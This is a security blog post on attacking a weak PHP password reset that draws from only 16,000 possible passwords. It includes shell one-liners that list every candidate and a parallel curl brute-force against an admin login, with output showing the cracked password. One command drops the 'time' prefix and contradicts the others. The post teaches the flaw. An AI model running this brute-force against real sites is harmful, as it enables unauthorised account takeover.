---
id: 1059
title: 'Hacking crappy password resets (part 2)'
date: '2011-03-15T08:09:41-05:00'
author: 'Ron Bowes'
layout: post
guid: 'http://www.skullsecurity.org/blog/?p=1059'
permalink: /2011/hacking-crappy-password-resets-part-2
categories:
    - Hacking
    - Passwords
    - Tools
---

Hey,

In my [last post](/blog/2011/hacking-crappy-password-resets-part-1), I showed how we could guess the output of a password-reset function with a million states. While doing research for that, I stumbled across some software that had a mere 16,000 states. I will show how to fully compromise this software package remotely using the password reset.

## The code

First, let's take a look at the code:

```

<font color="#ffa500"><?php</font><br></br>
  <font color="#ffff60"><b>if</b></font> <font color="#ffa500">(</font><font color="#40ffff">strtolower</font><font color="#ffa500">(</font><font color="#ffff60"><b>$</b></font><font color="#40ffff">cfgrow</font><font color="#ffa500">[</font>'<font color="#ffa0a0">email</font>'<font color="#ffa500">])</font><font color="#ffff60"><b>==</b></font><font color="#40ffff">strtolower</font><font color="#ffa500">(</font><font color="#ffff60"><b>$</b></font><font color="#40ffff">_POST</font><font color="#ffa500">[</font>'<font color="#ffa0a0">reminderemail</font>'<font color="#ffa500">]))</font><br></br>
  <font color="#ffa500">{</font><br></br>
    <font color="#80a0ff">// generate a random new pass</font><br></br>
    <font color="#ffff60"><b>$</b></font><font color="#40ffff">user_pass</font> <font color="#ffff60"><b>=</b></font> <font color="#40ffff">substr</font><font color="#ffa500">(</font> <font color="#40ffff">MD5</font><font color="#ffa500">(</font>'<font color="#ffa0a0">time</font>' <font color="#ffff60"><b>.</b></font> <font color="#40ffff">rand</font><font color="#ffa500">(</font><font color="#ffa0a0">1</font>, <font color="#ffa0a0">16000</font><font color="#ffa500">))</font>, <font color="#ffa0a0">0</font>, <font color="#ffa0a0">6</font><font color="#ffa500">)</font>;<br></br>
    <font color="#ffff60"><b>$</b></font><font color="#40ffff">query</font> <font color="#ffff60"><b>=</b></font> "<font color="#ffa0a0">update config set password=MD5('</font><font color="#ffff60"><b>$</b></font><font color="#40ffff">user_pass</font><font color="#ffa0a0">') where [...]</font>"<br></br>
    <font color="#ffff60"><b>if</b></font><font color="#ffa500">(</font><font color="#40ffff">mysql_query</font><font color="#ffa500">(</font><font color="#ffff60"><b>$</b></font><font color="#40ffff">query</font><font color="#ffa500">))</font><br></br>
    <font color="#ffa500">{</font><br></br>
       <font color="#80a0ff">// ...</font><br></br>
<font color="#ffa500">?></font><br></br>
```

## The vulnerability

The vulnerability lies in the password generation:

```
    <font color="#ffff60"><b>$</b></font><font color="#40ffff">user_pass</font> <font color="#ffff60"><b>=</b></font> <font color="#40ffff">substr</font><font color="#ffa500">(</font> <font color="#40ffff">MD5</font><font color="#ffa500">(</font>'<font color="#ffa0a0">time</font>' <font color="#ffff60"><b>.</b></font> <font color="#40ffff">rand</font><font color="#ffa500">(</font><font color="#ffa0a0">1</font>, <font color="#ffa0a0">16000</font><font color="#ffa500">))</font>, <font color="#ffa0a0">0</font>, <font color="#ffa0a0">6</font><font color="#ffa500">)</font>;<br></br>
```

The new password generated is the md5() of the literal string 'time' (\*not\* the current time, the \*word\* "time") concatenated with one of 16,000 random numbers, then truncated to 6 bytes. We can very easily generate the complete password list on the commandline:

```
$ seq <font color="#ffa0a0">1</font> <font color="#ffa0a0">16000</font> | xargs <font color="#ffa500">-I</font> XXX sh <font color="#ffa500">-c</font> <font color="#ffff60"><b>"</b></font><font color="#ffa0a0">echo timeXXX | md5sum | cut -b1-6</font><font color="#ffff60"><b>"</b></font>
```

or, another way:

```
$ <font color="#ffff60"><b>for </b></font>i <font color="#ffff60"><b>in</b></font> <font color="#ffa500">`seq </font><font color="#ffa0a0">1</font><font color="#ffa500"> </font><font color="#ffa0a0">16000</font><font color="#ffa500">`</font>; <font color="#ffff60"><b>do</b></font> <font color="#ffff60"><b>echo</b></font><font color="#ffa0a0"> </font><font color="#ffff60"><b>"</b></font><font color="#ffa0a0">time</font><font color="#ff80ff">$i</font><font color="#ffff60"><b>"</b></font><font color="#ffa0a0"> </font><font color="#ffff60"><b>|</b></font> md5sum <font color="#ffff60"><b>|</b></font> cut -b1<font color="#ffa0a0">-6</font><br></br>
```

(By the way, for more information on using xargs, check out a really awesome blog posting called [Taco Bell Programming](http://teddziuba.com/2010/10/taco-bell-programming.html) - it's like real programming, but you can't legally call it "beef")

In either case, you'll wind up with 16,000 different passwords in a file. If you want to speed up the eventual bruteforce, you can eliminate collisions:

```
$ seq 1 16000 | xargs -I XXX sh -c "echo XXX | md5sum | cut -b1-6" | sort | uniq
```

If you do that, you'll wind up with 15,993 different passwords, ranging from '000b64' to 'fffcc0'. Now all that's left is to try these 15,993 passwords against the site!

## The attack

You can do this attack any number of ways. You can script up some Perl/Ruby/PHP, you can use a scanner like Burp Suite, or, if you're feeling really adventurous, you can write a quick config file for [http-enum.nse](http://nmap.org/svn/scripts/http-enum.nse). If anybody takes the time to replicate this with http-enum.nse, you'll win an Internet from me. I promise.

But why bother with all these complicated pieces of software when we have bash handy? All we need to do is try all 15,993 passwords using wget/curl/etc and look for the one page that's different. Done!

So, to download a single page, we'd use:

```
$ curl <font color="#ffa500">-s</font> <font color="#ffa500">-o</font> XXX.out <font color="#ffa500">-d</font> <font color="#ffff60"><b>"</b></font><font color="#ffa0a0">user=admin&password=XXX</font><font color="#ffff60"><b>"</b></font> <font color="#ffff60"><b><</b></font>site<font color="#ffff60"><b>></b></font>/admin/?<font color="#40ffff">x</font>=login<br></br>
```

This will create a file called XXX.out on the filesystem, which is the output from a login attempt with the password XXX. Now we use xargs to do that for every password:

```
$ cat passwords.txt | xargs <font color="#ffa500">-P32</font> <font color="#ffa500">-I</font> XXX curl <font color="#ffa500">-s</font> <font color="#ffa500">-o</font> XXX.out <font color="#ffff60"><b>\</b></font><br></br>
  <font color="#ffa500">-d</font> <font color="#ffff60"><b>"</b></font><font color="#ffa0a0">user=admin&password=XXX</font><font color="#ffff60"><b>"</b></font> <font color="#ffff60"><b><</b></font>site<font color="#ffff60"><b>></b></font>/admin/?<font color="#40ffff">x</font>=login<br></br>
```

Which will, in 32 parallel processes, attempt to log in with each password and write the result to a file named <password>.out. Now all we have to do figure out which one's different! After waiting for it to finish (or not.. it takes about 5-10 minutes), I check the folder:

```
$ md5sum *.out | head 
96ffbb1ba380de9fc9e7a3fe316ff631  000176.out
96ffbb1ba380de9fc9e7a3fe316ff631  0014c2.out
96ffbb1ba380de9fc9e7a3fe316ff631  001e7e.out
96ffbb1ba380de9fc9e7a3fe316ff631  002035.out
96ffbb1ba380de9fc9e7a3fe316ff631  00217c.out
96ffbb1ba380de9fc9e7a3fe316ff631  002c47.out
96ffbb1ba380de9fc9e7a3fe316ff631  003b9e.out
96ffbb1ba380de9fc9e7a3fe316ff631  004bff.out
96ffbb1ba380de9fc9e7a3fe316ff631  0057b8.out
96ffbb1ba380de9fc9e7a3fe316ff631  008dea.out
```

Sure enough, it's tried all the passwords and they all seemed to download the same page! Now we use grep -v to find the one and only download that's different:

```
$ md5sum *.out | grep -v 96ffbb1ba380de9fc9e7a3fe316ff631
d41d8cd98f00b204e9800998ecf8427e  b19261.out
```

And bam! We now know the password is "b19261".

## Conclusion

So there you have it - abusing a password reset to log into an account you shouldn't. And remember, even though we didn't test this with 1,000,000 possible passwords like last week's blog, it would only take about 60 times as long - so instead of a few minutes, it'd be a few hours. And as I said last week, that million-password reset form was actually pretty common.

And in case you think this is hocus pocus or whatever, I wrote the code shown here live, on stage, at Winnipeg Code Camp. It's towards the end of [my talk](http://vimeo.com/20718776).